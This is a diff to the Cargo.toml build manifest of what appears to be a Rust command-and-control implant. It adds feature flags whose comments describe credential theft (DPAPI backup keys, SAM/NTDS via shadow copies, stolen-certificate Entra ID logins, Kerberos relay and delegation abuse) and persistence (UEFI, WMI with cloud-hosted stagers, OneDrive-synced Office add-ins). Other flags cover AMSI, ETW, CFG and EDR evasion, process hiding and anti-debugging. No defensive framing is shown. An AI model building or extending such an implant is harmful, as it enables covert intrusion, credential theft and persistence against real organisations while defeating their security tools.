@@ -18,6 +18,7 @@ junk_macro = { path = "../junk_macro" }
 pe_resolve = { path = "../pe_resolve" }
 string_crypt = { path = "../string_crypt" }
 common = { path = "../common" }
+uefi-persistence = { path = "../uefi-persistence", optional = true }
 log = "0.4"
 tokio = { workspace = true }
 tracing = { workspace = true }
@@ -47,6 +48,10 @@ tokio-rustls = { version = "0.26.4", default-features = false, features = ["ring
 rustls-pemfile = "2.2.0"
 rustls-native-certs = "0.8"
 rcgen = { version = "0.14.7", default-features = false, features = ["crypto", "ring", "pem"] }
+sha1 = "0.10"
+md-5 = "0.10"
+digest = "0.10"
+getrandom = "0.2"
 rand = "0.8"
 url = "2"
 thiserror = { workspace = true }
@@ -57,6 +62,11 @@ chacha20poly1305 = "0.10"
 x25519-dalek = { version = "2", features = ["static_secrets"] }
 hkdf = { version = "0.12" }
 ed25519-dalek = { version = "2", features = ["rand_core"] }
+# RSA key handling + RS256 JWT signing for Entra ID Pass-the-Certificate.
+# ring is already pulled in transitively by rustls and rcgen; listing it as a
+# direct dependency allows the entra-ptc feature to use ring::signature::RsaKeyPair
+# for JWT RS256 signing without introducing a new crypto crate.
+ring = { version = "0.17", optional = true }
 aes-gcm = "0.10"
 aes = "0.9.0"
 ctr = "0.10.0"
@@ -92,7 +102,7 @@ image = { version = "0.25", optional = true }
 enigo = { version = "0.2", optional = true }
 winreg = "0.52"
 image = { version = "0.25", optional = true }
-winapi = { version = "0.3", features = ["debugapi", "processthreadsapi", "memoryapi", "sysinfoapi", "winbase", "winnt", "libloaderapi", "winreg", "winnls", "winnetwk", "wow64apiset", "handleapi", "iphlpapi", "iptypes", "fileapi", "synchapi", "minwinbase", "tlhelp32", "combaseapi", "objbase", "objidlbase", "wtypesbase", "wingdi", "winuser", "oleauto", "oaidl", "objidl", "rpcdce", "rpcndr", "dpapi", "wincrypt", "errhandlingapi", "namedpipeapi"] }
+winapi = { version = "0.3", features = ["debugapi", "processthreadsapi", "memoryapi", "sysinfoapi", "winbase", "winnt", "libloaderapi", "winreg", "winnls", "winnetwk", "wow64apiset", "handleapi", "iphlpapi", "iptypes", "fileapi", "synchapi", "minwinbase", "tlhelp32", "combaseapi", "objbase", "objidlbase", "wtypesbase", "wingdi", "winuser", "oleauto", "oaidl", "objidl", "rpcdce", "rpcndr", "dpapi", "wincrypt", "errhandlingapi", "namedpipeapi", "wbemcli"] }
 hollowing = { path = "../hollowing" }
 nt_syscall = { path = "../nt_syscall" }
 
@@ -168,7 +178,7 @@ browser-data = []
 # Interacts with LSA authentication packages through documented interfaces,
 # operating within the LSA process's own security context.  Bypasses Credential
 # Guard and RunAsPPL.  Windows-only.  No extra crate dependencies.
-lsa-whisperer = []# Surveillance capabilities: screenshot capture (multi-monitor), keylogger
+lsa-whisperer = ["outbound-c"]# Surveillance capabilities: screenshot capture (multi-monitor), keylogger
 # (WH_KEYBOARD_LL with encrypted buffer), and clipboard monitoring (polling
 # thread with encrypted buffer).  Pulls in `dep:image` for PNG encoding.
 surveillance = ["dep:image"]# Activate the SSH covert transport (c2_ssh::SshTransport).
@@ -191,6 +201,15 @@ smb-pipe-transport = []
 # similar mitigations.  Default (without this feature) is the memory-patch
 # approach from amsi_defense.rs, which leaves no environment-variable trace.
 hwbp-amsi = []
+# General-purpose hardware-breakpoint hooking framework using x86_64 debug
+# registers (Dr0–Dr3) and a VEH handler.  Provides invisible hooks that do
+# not modify any bytes in the target function — completely immune to code-
+# integrity checks.  Manages up to 4 simultaneous breakpoints with per-slot
+# callback dispatch.  Includes integrations for ETW suppression and AMSI
+# bypass via hardware breakpoints (replacing the simpler Dr0/Dr1 approach
+# in evasion.rs).  Falls back to inline patching when all debug registers
+# are occupied.  Windows x86_64 only.
+hw-bp-hook = ["direct-syscalls"]
 # AMSI Write-Raid bypass: spawns a race thread that continuously overwrites the
 # AmsiInitFailed flag in amsi.dll's .data section, causing all subsequent
 # AmsiScanBuffer calls to return AMSI_RESULT_CLEAN without code patching.
@@ -204,6 +223,15 @@ write-raid-amsi = []
 # additional layer alongside the existing XChaCha20-Poly1305 sleep encryption.
 # Windows-only (uses NtProtectVirtualMemory, VEH).
 evanesco = []
+# Memory Encryption with Thread Context: encrypts thread register states
+# (CONTEXT structs), stack pointers, and TLS data during sleep obfuscation.
+# Suspends all non-current threads, captures and XChaCha20-Poly1305-encrypts
+# their CONTEXT structs, then restores on wake.  Prevents forensic tools from
+# recovering execution state from suspended thread registers.  Derives a
+# domain-separated key from the sleep-encryption key via HKDF.  Windows-only,
+# gated behind `thread-ctx-encrypt`.  Works alongside the existing sleep
+# obfuscation system as an additional layer.
+thread-ctx-encrypt = []
 # Kernel callback overwrite (BYOVD): surgically overwrite EDR kernel callback
 # function pointers to point to a `ret` instruction instead of NULLing them.
 # Defeats EDR self-integrity checks (CrowdStrike, Defender) that verify their
@@ -251,6 +279,17 @@ transacted-hollowing = ["direct-syscalls"]
 # Requires (and implies) `direct-syscalls`.  Windows-only.
 delayed-stomp = ["direct-syscalls"]
 
+# Phantom DLL hollowing: maps a DLL via NtCreateSection + NtMapViewOfSection
+# (never written to disk), creates a suspended host process (e.g. svchost.exe),
+# unmaps the host image, maps the phantom section into the host process,
+# fixes relocations + IAT, updates PEB ImageBaseAddress, and resumes. The
+# resulting process appears legitimate (host binary backed on disk) but
+# executes the phantom DLL's code. Uses exclusively section-based memory
+# management — no VirtualAlloc/VirtualAllocEx. Ranked above standard
+# ProcessHollow in auto-selection. Requires (and implies) `direct-syscalls`.
+# Windows x86_64 only.
+phantom-dll-hollow = ["direct-syscalls"]
+
 # User-mode NT kernel interface emulation: routes configured Nt* syscalls
 # through kernel32/advapi32 equivalents instead of ntdll syscall stubs.
 # Makes the agent invisible to EDR hooks on ntdll AND to ntdll unhooking
@@ -259,6 +298,15 @@ delayed-stomp = ["direct-syscalls"]
 # when kernel32 equivalent fails.  Requires (and implies) `direct-syscalls`.
 # Windows-only.
 syscall-emulation = ["direct-syscalls"]
+
+# SEH-based anti-debugging: constructs deeply nested VEH handler chains that
+# cause analysis tools, debuggers, and emulators to mis-execute or crash when
+# attempting to trace execution.  NOT traditional anti-debugging — operates
+# through the Windows exception dispatch mechanism itself.  Six strategies:
+# trap flag, CloseHandle, int 0x2D, icebp, lock-prefix null deref, and
+# instrumentation callback query.  Includes SEH-based code obfuscation,
+# anti-trace detection, and chain integrity verification.  Windows-only.
+seh-anti-debug = []
 
 # CET (Control-flow Enforcement Technology) / Shadow Stack bypass: handles
 # Windows 11 24H2+ hardware-enforced shadow stacks that defeat return-address
@@ -289,6 +337,189 @@ token-impersonation = ["direct-syscalls"]
 # Hooks into injection_engine post-injection for automatic cleanup.
 # Requires (and implies) `direct-syscalls`.  Windows-only.
 forensic-cleanup = ["direct-syscalls"]
+# Kerberos relay attack via COM cross-session activation: captures Kerberos
+# service tickets without NTLM by triggering COM activation (CoCreateInstanceEx
+# with custom COSERVERINFO) against an attacker-controlled RPC listener.
+# Parses the AP-REQ from the RPC bind security trailer using a minimal
+# ASN.1/DER decoder.  Known exploitable CLSIDs (BITS, ICertPassage,
+# TaskService, UpdateOrchestrator) are hardcoded.  API resolution via
+# pe_resolve (ole32.dll) — no IAT entries.  Requires SeImpersonatePrivilege
+# for COM activation.  Windows-only.
+kerberos-relay = []
+# DPAPI domain backup key retrieval and secret decryption via MS-BKRP
+# (BackupKey Remote Protocol).  Retrieves the domain backup key from a DC
+# using RPC over named pipe (\pipe\lsarpc), then decrypts DPAPI blobs
+# (Credential Store, Chrome, WiFi, RDP) without touching LSASS.  Any
+# domain-authenticated user can retrieve the backup key — no Domain Admin
+# required.  Uses CryptoAPI for RSA decryption and manual AES-256-CBC.
+# API resolution via pe_resolve — no IAT entries.  Windows-only.
+dpapi-backup = []
+shadow-credentials = []
+# S4U2Self / S4U2Proxy Kerberos delegation abuse: discovers accounts with
+# constrained delegation (msDS-AllowedToDelegateTo) or protocol transition
+# (TRUSTED_TO_AUTH_FOR_DELEGATION), then forges service tickets for arbitrary
+# users by issuing S4U2Self (PA-FOR-USER) followed by S4U2Proxy TGS requests
+# to the KDC.  Applies the forged ticket to the current logon session via
+# LsaCallAuthenticationPackage (KERB_SUBMIT_TKT).  Reuses LDAP infrastructure
+# from shadow_credentials (wldap32.dll via pe_resolve) for delegation discovery
+# and manual DER encoding for TGS-REQ/PA-FOR-USER construction.  KDC
+# communication over TCP port 88 with 4-byte big-endian length framing.
+# No IAT entries — all API resolution via pe_resolve hash-based resolution.
+# Windows-only, gated by `s4u-abuse` feature flag.
+s4u-abuse = []
+# COM Scriptlet (.sct) execution via xwizard.exe and alternative LOLBIN
+# dispatchers (odbcconf.exe, pcwrun.exe, forfiles.exe).  Generates COM
+# scriptlet XML with inline JScript/VBScript that hosts shellcode via
+# COM object instantiation (Scripting.FileSystemObject → ADODB.Stream →
+# shellcode exec).  xwizard.exe is signed by Microsoft and not commonly
+# monitored by EDR, making it a stealthy scriptlet host.  Supports disk-
+# based execution (TEMP directory .sct files) and memory-mapped execution
+# (NtCreateSection).  Includes LolbinDispatcher for fallback LOLBINs when
+# xwizard.exe is unavailable or blocked by AppLocker.  No powershell.exe,
+# cmd.exe, wscript.exe, or mshta.exe involved.  All API resolution via
+# pe_resolve — no IAT entries.  Windows-only, gated by `lolbin-xwizard`
+# feature flag.
+lolbin-xwizard = []
+# WSL2 as an evasion layer: uses the Windows Subsystem for Linux v2 to
+# execute ELF binaries, run Linux-native tools (curl, socat, ncat), and
+# relay C2 traffic through the WSL2 VM — completely outside the Windows
+# security product surface.  Detection probes for wsl.exe availability,
+# LxssManager service state, and registered distros.  Execution strategies
+# include: (1) writing ELF to Windows TEMP, accessing via /mnt/c/ from WSL,
+# (2) piping ELF bytes directly to memfd_create within WSL via stdin.
+# Networking via WSL2 (curl, socat, ncat) evades Windows-level network
+# monitoring.  File access via /mnt/c/ bridges Windows and WSL2 filesystems.
+# Injection into WSL2 processes via ptrace (Linux-native, invisible to
+# Windows EDR).  No Admin required — graceful degradation when WSL2 is
+# unavailable.  All API resolution via pe_resolve — no IAT entries.
+# Windows-only, gated by `wsl2-evasion` feature flag.
+wsl2-evasion = []
+# Registry-free COM object hijacking via SxS manifest activation contexts.
+# Redirects COM CLSID resolution to a proxy DLL without touching the Windows
+# registry.  Uses activation contexts (CreateActCtxW / ActivateActCtx /
+# DeactivateActCtx / ReleaseActCtx) resolved by hash from kernel32.dll.
+# Includes TargetSelector for identifying hijackable COM objects and a proxy
+# DLL PE generator.  No IAT entries — all API resolution via pe_resolve.
+# Windows-only.
+com-hijack = []
+
+# VSS (Volume Shadow Copy) pivoting: reads locked files (SAM, SYSTEM,
+# NTDS.dit) through VSS snapshot filesystem paths instead of direct access.
+# Bypasses file-access telemetry because EDR monitors direct opens but not
+# \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy paths.  Includes:
+# shadow copy discovery (WMI + vssadmin), VSS file reader (NtCreateFile +
+# NtReadFile via syscall!), SAM/NTDS credential harvesting (in-memory parsing
+# of registry hives and ESE databases), and selective cleanup (only deletes
+# agent-created snapshots).  Windows-only, gated by `vss-pivot` feature flag.
+vss-pivot = []
+
+# WMI permanent event subscriptions with encrypted cloud payloads.
+# Office add-in persistence via OneDrive sync: deploys macro-enabled
+# Excel (.xlam) or Word (.dotm) add-ins to OneDrive-synced XLSTART /
+# STARTUP folders.  The add-in file is automatically replicated to every
+# device the user signs into, providing fleet-wide persistence through
+# Microsoft's own sync infrastructure with zero per-machine deployment.
+# OneDrive path discovery (registry + env + filesystem probe), Office
+# Open XML + OLE2/CFB vbaProject.bin generation with VBA obfuscation,
+# NtCreateFile/NtWriteFile for write, registry-based AccessVBOM check,
+# and OneDrive-sync-aware cleanup (deletion syncs across all devices).
+# No Administrator privileges required.  Windows-only.
+office-addin = []
+# Installs WMI persistence triad via COM-based WMI operations.
+# Payloads encrypted with XChaCha20-Poly1305 and hosted on cloud
+# storage (Azure Blob, AWS S3, GitHub Gist).  The WMI subscription
+# objects contain no shellcode — only a stager command that fetches
+# and decrypts the payload at execution time.  Windows-only.
+wmi-persistence = []
+# UEFI firmware-level persistence: NVRAM manipulation, ESP driver deployment,
+# EFI PE/COFF stub building, runtime DXE driver support, capsule delivery,
+# and detection/cleanup of firmware implants.  Cross-platform crate (Linux
+# uses /sys/firmware/efi/efivars, Windows uses GetFirmwareEnvironmentVariableW).
+# Gated by `uefi-persistence` feature flag.
+uefi-persistence = ["dep:uefi-persistence"]
+# eBPF-based Linux evasion: hides the agent's process, files, and network
+# connections from user-space monitoring tools by loading eBPF programs that
+# intercept getdents64, openat, and read syscalls. Requires root or
+# CAP_BPF/CAP_SYS_ADMIN at runtime. Gracefully degrades if unprivileged.
+# Build-time requires `clang` for eBPF C→BPF compilation (skipped if absent).
+# Linux-only (x86_64 and aarch64). Kernel >= 4.15 for tracepoints,
+# >= 5.2 recommended for better BPF features.
+ebpf = ["direct-syscalls"]
+
+# Trampoline-based stack spoofing: builds multi-frame synthetic call stacks
+# using trampolines through legitimate modules (clean-mapped DLLs).  Extends
+# the single-frame spoof_call approach by chaining through 3–6 intermediate
+# gadgets in different system DLLs, producing a call stack that appears as
+# normal application worker threads to EDR stack-walking tools.  Uses a
+# separate allocated fake stack (NtAllocateVirtualMemory, PAGE_READWRITE)
+# with plausible return addresses, frame pointers, shadow space, and local
+# variable patterns.  Falls back to spoof_call when trampolines are
+# unavailable.  Integrates with clean_call! via the trampoline_spoof! macro.
+# Requires (and implies) `direct-syscalls`.  Windows x86_64 only.
+trampoline-spoof = ["direct-syscalls"]
+
+# Control Flow Guard (CFG) bypass: three strategies to bypass Microsoft's
+# CFG implementation which validates indirect call targets against a kernel-
+# maintained bitset of valid targets.  Strategy 1 manipulates the CFG bitset
+# directly (promotes agent/shellcode addresses as valid targets).  Strategy 2
+# routes execution through CFG-valid trampolines found in system DLLs.
+# Strategy 3 overrides the CFG dispatch function pointer to always return
+# TRUE.  Integrates with spoof_call and clean_call! to promote target
+# addresses before indirect calls.  Requires (and implies) `direct-syscalls`.
+# Windows x86_64 only.
+cfg-bypass = ["direct-syscalls"]
+
+# Adaptive C2 timing: learns the target network's traffic patterns and adjusts
+# callback timing to blend in.  Replaces simple fixed-percentage jitter with
+# Gaussian-distributed timing modelled on observed inter-arrival times.
+# Three phases: Learning (first N observations), Active (schedule callbacks
+# during peak traffic for cover), and Evasion (increase interval, avoid quiet
+# hours).  Gracefully degrades to standard jitter when insufficient data.
+# Cross-platform (no external ML dependencies).  Gated by `adaptive-timing`
+# feature flag.
+adaptive-timing = []
+
+# Reflective DLL loading via NtCreateSection + NtMapViewOfSection.
+# Loads PE DLLs into the current or a remote process without calling
+# VirtualAlloc/VirtualAllocEx at all — uses lower-level NT section
+# primitives that bypass the Win32 API layer entirely.  Handles PE32
+# and PE32+ (64-bit) images, relocation fixups, IAT rebuilding,
+# per-section memory protections, and header cleanup.  Remote variant
+# maps a shared section into both agent and target process.  Requires
+# (and implies) `direct-syscalls`.  Windows x86_64 only.
+reflective-loader = ["direct-syscalls"]
+
+# Page fault driven execution: keeps payload pages encrypted with
+# XChaCha20-Poly1305 under PAGE_NOACCESS.  A VEH handler intercepts
+# STATUS_ACCESS_VIOLATION faults, decrypts the faulting page, sets
+# PAGE_EXECUTE_READ, and resumes execution.  A periodic NtCreateTimer/
+# NtSetTimer APC re-encrypts pages that haven't been accessed recently,
+# minimizing the window in which decrypted code resides in memory.
+# Includes anomaly detection (excessive faults = scanning/emulation).
+# Windows x86_64 only.
+page-fault-exec = []
+
+# Counterfeit Object-Oriented Programming (COOP): an evolution of ROP that
+# chains calls through C++ virtual function dispatch rather than raw gadgets.
+# Because COOP chains go through legitimate vtable pointers, CFI/CFG
+# implementations see only valid indirect call targets.  Scans system DLLs
+# (ntdll, kernel32, etc.) for vtables, classifies virtual functions by
+# behavior (StoreArg0, LoadArg0, CallArg0, Arithmetic, NoOp), constructs
+# counterfeit objects with real vtable pointers, and chains operations via
+# virtual dispatch.  No executable memory allocated — only data (PAGE_READWRITE).
+# Windows x86_64 only.
+coop = []
+
+# Entra ID Pass-the-Certificate: authenticates to Microsoft Entra ID (Azure AD)
+# using a stolen or forged X.509 certificate + private key instead of a
+# password or secret.  Implements the OAuth2 client-credentials flow with
+# RS256 JWT assertion signed by the certificate's RSA key.  Supports both
+# Azure Commercial and Azure Government cloud endpoints.  Token management
+# includes automatic refresh, expiry tracking, and thread-safe caching.
+# Graph API helpers: list users, groups, applications, and custom queries.
+# Cross-platform (Entra ID is cloud-based — no Windows-only APIs needed).
+# Gated by `entra-ptc` feature flag (implies `ring` for RSA signing).
+entra-ptc = ["dep:ring"]
 
 [[bin]]
 name = "agent-standalone"
